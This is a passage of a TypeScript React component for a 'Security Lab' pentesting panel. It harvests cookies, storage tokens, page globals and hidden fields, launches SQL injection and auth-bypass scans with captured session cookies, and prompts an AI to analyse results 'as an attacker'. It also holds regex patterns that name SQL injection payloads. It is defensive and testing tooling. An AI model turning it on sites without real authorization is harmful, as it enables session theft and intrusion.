      if (req && !isStaticRequest({ ...req, ...res })) {
        setAutoAnalyzeBatch(prev => [...prev, { ...req, ...res }])
      }
    })
    const unsubBrowser = api.onSecurityBrowserEvent(addBrowserEvent)

    return () => {
      unsubReq()
      unsubRes()
      unsubBrowser()
    }
  }, [addBrowserEvent, addCapturedRequest, updateCapturedRequest])

  useEffect(() => {
    if (!selectedRequest) return
    setReplayMethod(selectedRequest.method)
    setReplayUrl(selectedRequest.url)
    setReplayHeaders(formatHeaders(selectedRequest.headers))
    setReplayBody(selectedRequest.body || '')
  }, [selectedRequest])

  useEffect(() => {
    let timeout: NodeJS.Timeout
    if (isAutoAnalyzeEnabled && autoAnalyzeBatch.length > 0) {
      timeout = setTimeout(() => {
        const batch = [...autoAnalyzeBatch]
        setAutoAnalyzeBatch([])
        handleAutoAnalyzeBatch(batch)
      }, 3000)
    }
    return () => clearTimeout(timeout)
  }, [autoAnalyzeBatch, isAutoAnalyzeEnabled])

  const refreshSessionData = async () => {
    const nextCookies = await getCookies(currentUrl.startsWith('http') ? currentUrl : undefined)
    setCookies(nextCookies)

    const webview = webviewRef.current
    if (!webview) return
    try {
      const snapshot = await webview.executeJavaScript(`(() => {
        const read = storage => Object.keys(storage).reduce((acc, key) => {
          acc[key] = storage.getItem(key)
          return acc
        }, {})
        return { localStorage: read(localStorage), sessionStorage: read(sessionStorage) }
      })()`)
      setStorageSnapshot(snapshot)
    } catch {
      setStorageSnapshot({ localStorage: {}, sessionStorage: {} })
    }
  }

  const captureWebsiteMemory = async () => {
    const webview = webviewRef.current
    if (!webview) return

    setMemoryCapturing(true)
    setActiveTab('memory')

    try {
      const dump = await webview.executeJavaScript(`(() => {
        // DOM Stats
        const allElements = document.querySelectorAll('*');
        const forms = Array.from(document.forms).map(f => ({
          action: f.action || '',
          method: f.method || 'GET',
          inputs: Array.from(f.querySelectorAll('input, textarea, select')).map(el => ({
            name: (el as any).name || '',
            type: (el as any).type || el.tagName.toLowerCase(),
            value: (el as any).value || '',
            placeholder: (el as any).placeholder || '',
          })),
        }));
        
        // Hidden fields
        const hiddenFields = Array.from(document.querySelectorAll('input[type="hidden"]')).map(el => ({
          name: (el as HTMLInputElement).name || '',
          value: (el as HTMLInputElement).value || '',
        }));
        
        // Global variables (window keys)
        const globals = [];
        const ignoreKeys = new Set(['window', 'self', 'document', 'location', 'top', 'parent', 'frames', 'closed', 'length', 'name', 'history', 'customElements', 'screen', 'navigator', 'visualViewport', 'origin', 'crypto', 'indexedDB', 'localStorage', 'sessionStorage']);
        for (const key of Object.getOwnPropertyNames(window)) {
          if (ignoreKeys.has(key) || key.startsWith('on') || key.startsWith('webkit') || key.startsWith('_')) continue;
          try {
            const val = (window as any)[key];
            if (val === null || val === undefined) continue;
            const type = typeof val;
            if (type === 'function' || type === 'object') {
              if (type === 'function') {
                globals.push({ key, type, preview: '[Function: ' + (val.name || 'anonymous') + ']' });
              } else if (Array.isArray(val)) {
                globals.push({ key, type: 'array[' + val.length + ']', preview: JSON.stringify(val.slice(0, 3)).slice(0, 200) });
              } else if (val instanceof HTMLElement || val instanceof Node) {
                globals.push({ key, type: 'DOM Element', preview: '<' + (val.tagName || '?').toLowerCase() + '>' });
              } else {
                try {
                  globals.push({ key, type: 'object', preview: JSON.stringify(val).slice(0, 200) });
                } catch {
                  globals.push({ key, type: 'object', preview: '[Object]' });
                }
              }
            } else {
              globals.push({ key, type, preview: String(val).slice(0, 200) });
            }
          } catch {}
        }
        
        // Meta tags
        const meta = Array.from(document.querySelectorAll('meta')).map(m => ({
          name: m.getAttribute('name') || m.getAttribute('property') || m.getAttribute('http-equiv') || '',
          content: m.getAttribute('content') || '',
        }));
        
        // Script sources
        const scriptSrcs = Array.from(document.querySelectorAll('script[src]')).map(s => (s as HTMLScriptElement).src);
        
        // Links
        const links = Array.from(document.querySelectorAll('a[href]')).map(a => (a as HTMLAnchorElement).href).slice(0, 100);
        
        // Find base64/encoded strings in the DOM
        const encodedStrings = [];
        const bodyText = document.body?.innerText || '';
        const base64Regex = /(?:[A-Za-z0-9+/]{20,}={0,2})/g;
        let match;
        while ((match = base64Regex.exec(bodyText)) !== null) {
          const val = match[0];
          if (val.length > 20 && val.length < 5000) {
            try {
              const decoded = atob(val);
              if (/^[\\x20-\\x7E\\n\\r\\t]+$/.test(decoded) && decoded.length > 3) {
                encodedStrings.push({ value: val.slice(0, 200), encoding: 'base64', decoded: decoded.slice(0, 500) });
              }
            } catch {}
          }
          if (encodedStrings.length >= 20) break;
        }
        
        // Also check localStorage/sessionStorage for encoded values
        const checkEncoded = (storage) => {
          for (const [key, val] of Object.entries(storage)) {
            if (typeof val === 'string' && val.length > 20) {
              for (const encoding of ['base64', 'jwt']) {
                if (encoding === 'jwt' && /^eyJ/.test(val)) {
                  try {
                    const parts = val.split('.');
                    const payload = JSON.parse(atob(parts[1]));
                    encodedStrings.push({ value: val.slice(0, 100) + '...', encoding: 'jwt', decoded: JSON.stringify(payload, null, 2) });
                  } catch {}
                }
              }
            }
          }
        };
        
        const ls = {};
        const ss = {};
        try {
          for (const k of Object.keys(localStorage)) { ls[k] = localStorage.getItem(k) || ''; }
          for (const k of Object.keys(sessionStorage)) { ss[k] = sessionStorage.getItem(k) || ''; }
          checkEncoded(ls);
          checkEncoded(ss);
        } catch {}
        
        return {
          url: location.href,
          title: document.title,
          capturedAt: new Date().toISOString(),
          dom: {
            tagCount: allElements.length,
            textNodes: document.body?.innerText?.length || 0,
            forms: forms.length,
            links: links.length,
            scripts: scriptSrcs.length,
            images: document.querySelectorAll('img').length,
          },
          forms,
          globals: globals.slice(0, 100),
          localStorage: ls,
          sessionStorage: ss,
          meta,
          scriptSrcs: scriptSrcs.slice(0, 50),
          encodedStrings,
          hiddenFields,
          links: links.slice(0, 50),
        };
      })()`)

      setWebsiteMemoryDump(dump as WebsiteMemoryDump)
    } catch (err) {
      console.error('[SecurityPanel] Falha ao capturar memória:', err)
    } finally {
      setMemoryCapturing(false)
    }
  }

  const analyzeMemoryWithAI = () => {
    if (!websiteMemoryDump || !currentUrl) return

    const { hackerMode } = useSkillStore.getState()
    const encodedReport = websiteMemoryDump.encodedStrings.length > 0
      ? websiteMemoryDump.encodedStrings.map(e => `  - [${e.encoding.toUpperCase()}] ${e.value}\n    Decodificado: ${e.decoded || '(falhou)'}`).join('\n')
      : 'Nenhuma string codificada detectada'

    const hiddenReport = websiteMemoryDump.hiddenFields.length > 0
      ? websiteMemoryDump.hiddenFields.map(f => `  - ${f.name}: ${f.value}`).join('\n')
      : 'Nenhum campo hidden encontrado'

    const globalKeysReport = websiteMemoryDump.globals
      .filter(g => /token|key|secret|auth|api|jwt|session|pass|cred/i.test(g.key))
      .map(g => `  - window.${g.key} (${g.type}): ${g.preview}`)
      .join('\n') || 'Nenhuma chave suspeita encontrada no escopo global'

    const storageReport = Object.entries(websiteMemoryDump.localStorage)
      .filter(([k]) => /token|key|secret|auth|jwt|session|pass/i.test(k))
      .map(([k, v]) => `  - localStorage.${k}: ${v.slice(0, 200)}`)
      .join('\n')

    const message = `${hackerMode ? '🔴 [MODO HACKER] ' : ''}📊 **DUMP DE MEMÓRIA DO SITE: ${websiteMemoryDump.url}**
**Título:** ${websiteMemoryDump.title}
**Capturado em:** ${websiteMemoryDump.capturedAt}

### 📐 Estrutura do DOM
- ${websiteMemoryDump.dom.tagCount} elementos HTML
- ${websiteMemoryDump.dom.textNodes.toLocaleString()} caracteres de texto
- ${websiteMemoryDump.dom.forms} formulários
- ${websiteMemoryDump.dom.links} links
- ${websiteMemoryDump.dom.scripts} scripts externos
- ${websiteMemoryDump.dom.images} imagens

### 🔑 Chaves Globais Suspeitas
${globalKeysReport}

### 🗄️ Storage Suspeito
${storageReport || 'Nenhum item sensível no storage'}

### 🔐 Strings Codificadas Detectadas (Base64 / JWT / etc)
${encodedReport}

### 👁️ Campos Hidden
${hiddenReport}

### 📝 Formulários (${websiteMemoryDump.forms.length})
${websiteMemoryDump.forms.map(f => `- ${f.method} ${f.action} (${f.inputs.length} inputs)`).join('\n')}

### 🔗 Scripts Externos
${websiteMemoryDump.scriptSrcs.slice(0, 20).map(s => `- ${s}`).join('\n') || 'Nenhum'}

${hackerMode ? `
🎯 **MISSÃO**: Analise este dump de memória como um hacker ético:
1. Identifique tokens, chaves e segredos potencialmente expostos
2. Decifre TODAS as strings codificadas (base64, JWT, hex, etc)
3. Encontre vulnerabilidades de exposição de dados no client-side
4. Analise os campos hidden e veja se há dados sensíveis
5. Verifique os scripts externos por possíveis supply chain attacks
6. Dê uma nota de exposição (0-10) com justificativa

Responda SEMPRE no formato profissional de hacker ético.
` : `
Analise este dump de memória:
1. Identifique dados sensíveis expostos
2. Decifre strings codificadas
3. Dê recomendações de segurança
`}`

    useAIStore.getState().sendMessage(message)
    if (!useAIStore.getState().isPanelOpen) togglePanel()
  }

  const navigate = () => {
    const url = normalizeUrl(targetUrl)
    const newDomain = extractDomain(url)
    const oldDomain = previousDomainRef.current
    
    // Se mudou de domínio, limpa todos os dados do site anterior
    if (newDomain && newDomain !== oldDomain) {
      clearSiteData()
    }
    
    previousDomainRef.current = newDomain || ''
    setCurrentUrl(url)
    webviewRef.current?.loadURL(url)
    setActiveTab('browser')
  }

  const toggleProxy = async () => {
    if (isProxyRunning) {
      await stopProxy()
    } else {
      await startProxy(parseInt(portInput) || 8080)
    }
  }

  const toggleMitm = async () => {
    if (isMitmRunning) {
      await stopMitm()
    } else {
      await startMitm(parseInt(mitmPortInput) || 8899)
      webviewRef.current?.reload()
    }
  }

  const runPentest = async (testType: 'all' | 'sqli' | 'auth-bypass' | 'database-access' = 'all') => {
    if (pentestRunning) return
    if (!currentUrl || currentUrl === 'about:blank') return
    
    setPentestRunning(true)
    setPentestProgress('Inicializando motor de pentest...')
    setPentestProgressValue(0)
    setPentestTestingFor(testType)
    setPentestResults(null)

    const api = getApi()
    if (!api || !(api as any).securityPentestRequest) {
      setPentestProgress('❌ API de pentest não disponível')
      setPentestRunning(false)
      return
    }

    const httpClient = (url: string, options?: { method?: string; headers?: Record<string, string>; body?: string; timeout?: number }) => {
      return (api as any).securityPentestRequest({ url, ...options })
    }

    // Coletar contexto do tráfego capturado para enriquecer os testes
    const capturedUrls = capturedRequests
      .filter(r => r.url && !r.url.startsWith('data:') && !r.url.startsWith('blob:'))
      .map(r => r.url)
    const capturedTokens = sensitiveArtifacts.map(a => ({
      name: a.name,
      value: a.value,
      source: a.source,
      risk: a.risk
    }))
    const authCookies = cookies
      .filter(c => c.name.toLowerCase().includes('session') || c.name.toLowerCase().includes('token') || c.name.toLowerCase().includes('auth') || c.name.toLowerCase().includes('jwt'))
      .map(c => ({ name: c.name, value: c.value, domain: c.domain }))

    const engine = new PenTestEngine({
      targetUrl: currentUrl,
      httpClient,
      context: {
        cookies: authCookies.length > 0 ? authCookies : cookies.map(c => ({ name: c.name, value: c.value, domain: c.domain })),
        capturedUrls,
        capturedTokens,
        sessionData: storageSnapshot,
      }
    })
    pentestEngineRef.current = engine
    
    engine.onProgress = (message, progress) => {
      setPentestProgress(message)
      setPentestProgressValue(Math.min(progress, 99))
    }
    
    engine.onFindingsUpdate = (findings) => {
      setPentestFindings(findings)
    }

    try {
      let result: PenTestResult
      if (testType === 'all') {
        result = await engine.runFullScan()
      } else {
        result = await engine.runSingleTest(testType)
      }
      setPentestProgressValue(100)
      setPentestProgress(result.cancelled ? '⛔ Teste cancelado. Resultados parciais exibidos.' : '✅ Teste concluído!')
      setPentestResults(result)
    } catch (err) {
      setPentestProgress(`❌ Erro: ${err instanceof Error ? err.message : 'Falha no teste'}`)
    } finally {
      setPentestRunning(false)
    }
  }

  const runPentestWithAI = async () => {
    if (pentestRunning) return
    if (!currentUrl || currentUrl === 'about:blank') return
    
    setPentestRunning(true)
    setPentestProgress('Executando varredura completa para análise da IA...')
    setPentestProgressValue(0)
    setPentestResults(null)
    
    // Coletar contexto de cookies e tokens para enriquecer
    const capturedUrls = capturedRequests
      .filter(r => r.url && !r.url.startsWith('data:') && !r.url.startsWith('blob:'))
      .map(r => r.url)
    const capturedTokens = sensitiveArtifacts.map(a => ({ name: a.name, value: a.value, source: a.source, risk: a.risk }))
    const authCookies = cookies
      .filter(c => c.name.toLowerCase().includes('session') || c.name.toLowerCase().includes('token') || c.name.toLowerCase().includes('auth') || c.name.toLowerCase().includes('jwt'))
      .map(c => ({ name: c.name, value: c.value, domain: c.domain }))
    
    const engine = new PenTestEngine({
      targetUrl: currentUrl,
      httpClient: (url: string, options?: any) => (getApi() as any).securityPentestRequest({ url, ...options }),
      context: {
        cookies: authCookies.length > 0 ? authCookies : cookies.map(c => ({ name: c.name, value: c.value, domain: c.domain })),
        capturedUrls,
        capturedTokens,
        sessionData: storageSnapshot,
      }
    })
    pentestEngineRef.current = engine
    
    engine.onProgress = (message, progress) => {
      setPentestProgress(message)
      setPentestProgressValue(Math.min(progress, 99))
    }
    
    engine.onFindingsUpdate = (findings) => {
      setPentestFindings(findings)
    }

    try {
      const result = await engine.runFullScan()
      setPentestProgressValue(100)
      setPentestProgress(result.cancelled ? '⛔ Cancelado.' : '✅ Varredura concluída! Enviando para IA analista...')
      setPentestResults(result)
      
      const reportText = engine.generateSummaryForAI(result)
      
      // Se modo hacker ativo, usa prompt hacker agressivo
      const hackerMode = useSkillStore.getState().hackerMode
      
      if (hackerMode) {
        const hackerMessage = `🔴 [MODO HACKER ÉTICO — PENTEST AUTORIZADO]

ALVO: ${currentUrl}
AUTORIZAÇÃO: Teste autorizado pelo proprietário do site.

Acabei de executar uma varredura automatizada e encontrei os seguintes resultados preliminares:

${reportText}

🎯 SUA MISSÃO como Hacker Ético:
1. Analise profundamente cada vulnerabilidade encontrada
2. Pense como um atacante real — como você exploraria cada falha?
3. Descreva o impacto real de cada vulnerabilidade no negócio
4. Dê instruções exatas de como corrigir (código, configuração)
5. Se houver vulnerabilidades críticas, detalhe o passo a passo do ataque
6. Dê uma nota de segurança geral (0-10) com justificativa técnica

⚠️ FORMATO DE RESPOSTA OBRIGATÓRIO:
Sempre responda neste formato profissional:

### 🎯 Resumo da Invasão
### 🔴 Vulnerabilidades Encontradas (tabela)
### 📋 Detalhes Técnicos de Cada Vulnerabilidade
### ✅ Recomendações de Correção (passo a passo)
### 📊 Nota de Segurança: X/10
### 📄 Próximos Passos

Seja técnico, direto e implacável. Este relatório será enviado para a empresa contratante.`
        
        useAIStore.getState().sendMessage(hackerMessage)
      } else {
        const aiMessage = `[SISTEMA DE SEGURANÇA - PENTEST AUTOMATIZADO]

Realizei uma varredura de segurança automatizada no site: ${currentUrl}

${reportText}

Analise os resultados acima:
1. O que cada vulnerabilidade encontrada significa
2. Como corrigir cada problema
3. Se alguma vulnerabilidade crítica foi encontrada, explique o risco
4. Dê uma nota de segurança geral para este site (0-10)

Seja direto e técnico. Use markdown para organizar sua resposta.`
        useAIStore.getState().sendMessage(aiMessage)
      }
      
      if (!useAIStore.getState().isPanelOpen) togglePanel()
    } catch (err) {
      setPentestProgress(`❌ Erro: ${err instanceof Error ? err.message : 'Falha no teste'}`)
    } finally {
      setPentestRunning(false)
    }
  }

  // Gerar relatório profissional para download
  const generateProfessionalReport = () => {
    if (!pentestResults) return
    
    const date = new Date().toLocaleString('pt-BR')
    const targets = currentUrl
    const testType = pentestTestingFor === 'all' ? 'Completo (OWASP Top 10)' : pentestTestingFor.toUpperCase()
    const status = pentestResults.cancelled ? 'Parcial (cancelado)' : 'Concluído'
    
    const critical = pentestResults.summary.critical
    const high = pentestResults.summary.high
    const medium = pentestResults.summary.medium
    const low = pentestResults.summary.low
    const total = pentestResults.summary.total
    
    // Monta detalhes das vulnerabilidades
    const findingsText = pentestResults.findings.length === 0
      ? '✅ Nenhuma vulnerabilidade encontrada durante o teste.'
      : pentestResults.findings.map((f, i) => {
          const sevEmoji = f.severity === 'critical' ? '🔴' : f.severity === 'high' ? '🟠' : f.severity === 'medium' ? '🟡' : '🔵'
          const sevLabel = f.severity.toUpperCase()
          return `### ${sevEmoji} [${sevLabel}] ${i + 1}. ${f.title}

| Campo | Valor |
|-------|-------|
| **Tipo** | ${f.type} |
| **Severidade** | ${sevLabel} |
| **Endpoint** | \`${f.endpoint}\` |
| **Payload** | \`${f.payload}\` |
| **Evidência** | ${f.evidence} |

**PoC (Prova de Conceito):**
\`\`\`
${f.poc}
\`\`\`

**Descrição:** ${f.description}

${f.manualTest ? '**Testes Manuais Recomendados:**\n' + f.manualTest.map(t => `- ${t}`).join('\n') : ''}

---`
        }).join('\n\n')
    
    // Monta recomendações
    const recommendations = pentestResults.findings.length === 0
      ? 'Nenhuma correção necessária. O site demonstrou resiliência contra os testes realizados.'
      : pentestResults.findings.map(f => {
          if (f.type === 'sqli') return `**${f.title}:** Implementar Prepared Statements em todas as queries. Usar ORM com parameter binding. Validar e sanitizar todos os inputs do usuário.`
          if (f.type === 'auth-bypass') return `**${f.title}:** Implementar rate limiting. Usar senhas fortes. Adicionar MFA. Corrigir lógica de autenticação.`
          if (f.type === 'database-access') return `**${f.title}:** Restringir acesso ao banco de dados por IP. Remover credenciais hardcoded. Usar princípio do menor privilégio.`
          if (f.type === 'info-disclosure') return `**${f.title}:** Remover informações sensíveis de respostas HTTP. Desabilitar stack traces em produção. Configurar headers de segurança.`
          return `**${f.title}:** Corrigir conforme melhores práticas de segurança.`
        }).join('\n\n')
    
    const score = total === 0 ? 10 : Math.max(0, 10 - (critical * 4) - (high * 2) - medium)
    const scoreText = total === 0
      ? 'Site demonstrou excelente postura de segurança durante os testes.'
      : critical > 0
        ? 'Vulnerabilidades críticas exigem correção IMEDIATA. O site está em risco severo de comprometimento.'
        : high > 0
          ? 'Vulnerabilidades altas requerem atenção urgente. Risco significativo de exploração.'
          : 'Vulnerabilidades moderadas que devem ser corrigidas no próximo ciclo de desenvolvimento.'
    
    const evidence = pentestResults.findings.map(f => 
      `- [${f.severity.toUpperCase()}] ${f.title} — Endpoint: ${f.endpoint}\n  Payload: ${f.payload}\n  Evidência: ${f.evidence.slice(0, 200)}`
    ).join('\n\n')
    
    const report = HACKER_REPORT_HEADER
      .replace('{date}', date)
      .replace('{target}', targets)
      .replace('{testType}', testType)
      .replace('{status}', status)
      .replace('{critical}', String(critical))
      .replace('{high}', String(high))
      .replace('{medium}', String(medium))
      .replace('{low}', String(low))
      .replace('{total}', String(total))
      .replace('{findings}', findingsText)
      .replace('{recommendations}', recommendations)
      .replace('{score}', String(score))
      .replace('{scoreJustification}', scoreText)
      .replace('{evidence}', evidence || 'Nenhuma evidência adicional.')
      .replace('{date}', date)
    
    // Download do relatório
    const blob = new Blob([report], { type: 'text/markdown;charset=utf-8' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    const safeDate = new Date().toISOString().slice(0, 10)
    const safeHost = currentUrl.replace(/https?:\/\//, '').replace(/[^a-zA-Z0-9]/g, '_').slice(0, 30)
    a.href = url
    a.download = `pentest-report_${safeHost}_${safeDate}.md`
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    URL.revokeObjectURL(url)
  }

  const handleAutoAnalyzeBatch = (batch: CapturedRequest[]) => {
    if (batch.length === 0) return

    // Primeiro vamos detectar padrões de SQLi ou outros riscos manualmente
    const findings = []
    
    for (const req of batch) {
      const requestData = [req.url, req.body, JSON.stringify(req.headers)].join(' ').toLowerCase()
      
      // Verificar SQLi
      const sqlInjectionPatterns = [
        /'(\s+)?or(\s+)?'(\d+)?'(\s+)?=(\s+)?'(\d+)?/i, // ' OR '1'='1
        /'(\s+)?or(\s+)?1(\s+)?=(\s+)?1/i, // ' OR 1=1
        /'(\s+)?union(\s+)?select/i, // ' UNION SELECT
        /;(\s+)?drop(\s+)?table/i, // ; DROP TABLE
        /;(\s+)?delete(\s+)?from/i, // ; DELETE FROM
      ]
      
      const hasSqlInjection = sqlInjectionPatterns.some(pattern => pattern.test(requestData))
      
      if (hasSqlInjection) {
        findings.push(`[RISCO ALTO] SQL Injection detectado em ${req.method} ${req.url}`)
      }
      
      // Verificar erros 500
      if (req.status && req.status >= 500) {
        findings.push(`[RISCO MÉDIO] Erro 500 detectado em ${req.method} ${req.url} - pode vazar informações sensíveis`)
      }
    }

    // Se houver findings, enviar para IA com formato bonito
    if (findings.length > 0) {
      const findingsText = findings.join('\n')
      useAIStore.getState().sendMessage(`[SISTEMA DE SEGURANÇA] Encontrei alguns pontos de atenção durante a análise de segurança do site atual. Faça uma análise amigável e direta em formato de mensagem, como se fosse um assistente conversando com o usuário. Informe o que foi detectado de forma clara e organizada, sem precisar de ações do usuário, apenas um aviso informativo.

Riscos detectados:
${findingsText}`)
      if (!useAIStore.getState().isPanelOpen) togglePanel()
    } else {
      // Se não houver findings automáticos, fazer análise geral
      const reqsText = batch.map(req => `
**URL:** ${req.method} ${req.url}
**Status:** ${req.status || req.error || 'pendente'}
**Headers:** ${formatHeaders(req.headers)}
**Body:** ${req.body ? req.body.slice(0, 1200) : ''}
`).join('\n\n')

      useAIStore.getState().sendMessage(`[SISTEMA DE SEGURANÇA] Analise o tráfego abaixo e informe se encontrou algo relevante. Responda em formato de conversa amigável, como um assistente falando diretamente com o usuário. Se não houver problemas, apenas informe que está tudo ok.

${reqsText}`)

      if (!useAIStore.getState().isPanelOpen) togglePanel()
    }
  }

  const handleAnalyze = (req: CapturedRequest) => {
    addMessage({
      id: Date.now().toString(),
      role: 'user',
      timestamp: Date.now(),
      type: 'text',
      content: `Analise esta requisição/resposta como validação de segurança autorizada. Quero apontamentos, evidências e correções.

\`\`\`http
${req.method} ${req.url} HTTP/1.1
${formatHeaders(req.headers)}

${req.body || ''}
\`\`\`

\`\`\`http
HTTP/1.1 ${req.status || 'N/A'}
${formatHeaders(req.responseHeaders)}

${req.responseBody ? req.responseBody.slice(0, 2000) : ''}
\`\`\``
    })

    if (!useAIStore.getState().isPanelOpen) togglePanel()
  }

  const handleReplay = async () => {
    const result = await replayRequest({
      method: replayMethod,
      url: replayUrl,
      headers: parseHeaders(replayHeaders),
      body: replayBody,
    })
    if (result && selectedRequest) {
      updateCapturedRequest(selectedRequest.id, { replayResult: result })
    }
  }

  const copyReport = async () => {
    await navigator.clipboard.writeText(report)
    setReportCopied(true)
    window.setTimeout(() => setReportCopied(false), 1400)
  }

  const openHtmlReportInBrowser = () => {
    const now = new Date()
    const title = `Relatório de Segurança - ${now.toLocaleString()}`
    const filenameDate = now.toISOString().slice(0, 10)

    const findingsHtml = securityFindings.map(finding => {
      const badgeClass = finding.severity === 'alto'
        ? 'sev sev-high'
        : finding.severity === 'medio'
        ? 'sev sev-med'
        : 'sev sev-low'

      const evidence = finding.evidence.length
        ? `<ul class="list">${finding.evidence.map(item => `<li>${escapeHtml(item)}</li>`).join('')}</ul>`
        : `<div class="muted">Sem evidências listadas.</div>`

      const remediation = finding.remediation.length
        ? `<ul class="list">${finding.remediation.map(item => `<li>${escapeHtml(item)}</li>`).join('')}</ul>`
        : `<div class="muted">Sem recomendações automáticas.</div>`

      const validation = finding.validation.length
        ? `<ul class="list">${finding.validation.map(item => `<li>${escapeHtml(item)}</li>`).join('')}</ul>`
        : `<div class="muted">Sem passos de validação automática.</div>`

      return `
        <section class="card">
          <div class="card-head">
            <span class="${badgeClass}">${escapeHtml(finding.severity.toUpperCase())}</span>
            <div class="card-title">${escapeHtml(finding.title)}</div>
            <div class="card-cat">${escapeHtml(finding.category)}</div>
          </div>
          <div class="card-desc">${escapeHtml(finding.description)}</div>
          <div class="grid">
            <div>
              <h3>Evidências</h3>
              ${evidence}
            </div>
            <div>
              <h3>Soluções sugeridas</h3>
              ${remediation}
            </div>
          </div>
          <div class="mt">
            <h3>Como validar</h3>
            ${validation}
          </div>
        </section>
      `
    }).join('')

    const artifactsHtml = sensitiveArtifacts.length
      ? sensitiveArtifacts.map(item => `
          <div class="card">
            <div class="card-head">
              <span class="${item.risk === 'alto' ? 'sev sev-high' : item.risk === 'medio' ? 'sev sev-med' : 'sev sev-low'}">${escapeHtml(item.risk.toUpperCase())}</span>
              <div class="card-title">${escapeHtml(item.name)}</div>
              <div class="card-cat">${escapeHtml(item.type)}</div>
            </div>
            <div class="muted">${escapeHtml(item.source)} — ${escapeHtml(item.location)}</div>
            <pre class="code">${escapeHtml(maskSecret(item.value))}</pre>
            <ul class="list">${item.reasons.map(r => `<li>${escapeHtml(r)}</li>`).join('')}</ul>
          </div>
        `).join('')
      : `<div class="muted">Nenhum token/chave sensível detectado automaticamente.</div>`

    const html = `<!doctype html>
<html lang="pt-br">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>${escapeHtml(title)}</title>
    <style>
      :root {
        color-scheme: dark;
        --bg: #070b0a;
        --panel: rgba(255,255,255,0.04);
        --border: rgba(255,255,255,0.10);
        --text: #e6e9ef;
        --muted: rgba(230,233,239,0.65);
        --accent: #59d27c;
        --high: #ff5c7a;
        --med: #f5c15a;
        --low: #7aa2f7;
      }
      body { margin: 0; font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial; background: radial-gradient(900px 500px at 10% 10%, rgba(89,210,124,0.14), transparent 70%), var(--bg); color: var(--text); }
      .wrap { max-width: 980px; margin: 0 auto; padding: 28px 18px 54px; }
      .top { display: flex; align-items: center; justify-content: space-between; gap: 16px; padding: 16px 18px; border: 1px solid var(--border); background: var(--panel); border-radius: 14px; }
      .title { font-size: 18px; font-weight: 800; letter-spacing: 0.2px; }
      .meta { font-size: 12px; color: var(--muted); }
      .print-btn { padding: 8px 16px; border-radius: 8px; background: var(--accent); color: #070b0a; font-weight: 700; border: none; cursor: pointer; }
      .print-btn:hover { opacity: 0.9; }
      .kpis { display: grid; grid-template-columns: repeat(5, minmax(0, 1fr)); gap: 10px; margin-top: 14px; }
      .kpi { border: 1px solid var(--border); background: var(--panel); border-radius: 12px; padding: 10px 12px; }
      .kpi .k { font-size: 11px; color: var(--muted); }
      .kpi .v { font-size: 16px; font-weight: 800; margin-top: 6px; }
      h2 { margin: 22px 0 10px; font-size: 14px; letter-spacing: 0.3px; text-transform: uppercase; color: var(--muted); }
      h3 { margin: 0 0 8px; font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.3px; }
      .card { border: 1px solid var(--border); background: var(--panel); border-radius: 14px; padding: 14px 14px; margin-top: 12px; }
      .card-head { display: grid; grid-template-columns: auto 1fr auto; align-items: center; gap: 10px; margin-bottom: 10px; }
      .card-title { font-weight: 800; }
      .card-cat { font-size: 11px; color: var(--muted); }
      .card-desc { color: var(--muted); font-size: 12px; line-height: 1.45; margin-bottom: 10px; }
      .sev { font-size: 11px; font-weight: 900; padding: 4px 8px; border-radius: 999px; border: 1px solid var(--border); }
      .sev-high { color: var(--high); background: rgba(255, 92, 122, 0.10); border-color: rgba(255, 92, 122, 0.25); }
      .sev-med { color: var(--med); background: rgba(245, 193, 90, 0.10); border-color: rgba(245, 193, 90, 0.25); }
      .sev-low { color: var(--low); background: rgba(122, 162, 247, 0.10); border-color: rgba(122, 162, 247, 0.25); }
      .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
      .list { margin: 0; padding-left: 16px; color: var(--text); font-size: 12px; line-height: 1.5; }
      .muted { color: var(--muted); font-size: 12px; line-height: 1.45; }
      .code { margin-top: 10px; background: rgba(0,0,0,0.35); border: 1px solid var(--border); border-radius: 10px; padding: 10px; overflow: auto; }
      .mt { margin-top: 12px; }
      @media (max-width: 860px) {
        .kpis { grid-template-columns: repeat(2, minmax(0, 1fr)); }
        .grid { grid-template-columns: 1fr; }
      }
      @media print {
        .print-btn { display: none; }
      }
    </style>
  </head>
  <body>
    <div class="wrap">
      <div class="top">
        <div>
          <div class="title">${escapeHtml(title)}</div>
          <div class="meta">Escopo observado: navegador controlado Ezek</div>
        </div>
        <div style="display: flex; gap: 12px; align-items: center;">
          <div class="meta">Gerado em ${escapeHtml(now.toLocaleString())}</div>
          <button class="print-btn" onclick="window.print()">Salvar como PDF</button>
        </div>
      </div>

      <div class="kpis">
        <div class="kpi"><div class="k">Requisições capturadas</div><div class="v">${capturedRequests.length}</div></div>
        <div class="kpi"><div class="k">Requisições dinâmicas</div><div class="v">${dynamicRequests.length}</div></div>
        <div class="kpi"><div class="k">Cookies observados</div><div class="v">${cookies.length}</div></div>
        <div class="kpi"><div class="k">Segredos suspeitos</div><div class="v">${sensitiveArtifacts.length}</div></div>
        <div class="kpi"><div class="k">Eventos de sessão</div><div class="v">${browserEvents.length}</div></div>
      </div>

      <h2>Apontamentos</h2>
      ${findingsHtml || `<div class="muted">Nenhum apontamento automático encontrado.</div>`}

      <h2>Tokens, chaves e sessões</h2>
      ${artifactsHtml}
    </div>
  </body>
</html>`

    const api = getApi()
    if (api) {
      api.securityOpenHtmlInBrowser(html, `security-report-${filenameDate}.html`)
    }
  }

  const wipeBrowser = async () => {
    await clearBrowserData()
    setCookies([])
    setStorageSnapshot({ localStorage: {}, sessionStorage: {} })
    webviewRef.current?.reload()
  }

  const tabButton = (tab: SecurityTab, label: string) => (
    <button
      onClick={() => setActiveTab(tab)}
      className={`h-8 px-3 border-b-2 transition-colors ${activeTab === tab ? 'border-nova-accent text-nova-accent bg-nova-accent/5' : 'border-transparent text-nova-text-secondary hover:text-nova-text hover:bg-nova-hover/50'}`}
    >
      {label}
    </button>
  )

  return (
    <div className="h-full flex flex-col bg-nova-bg text-nova-text text-xs">
      <div className="h-10 shrink-0 bg-nova-bg-secondary border-b border-nova-border flex items-center gap-2 px-2">
        <Shield size={14} className={isMonitoring ? 'text-nova-success' : 'text-nova-text-muted'} />
        <span className="font-semibold mr-2">Security Lab</span>

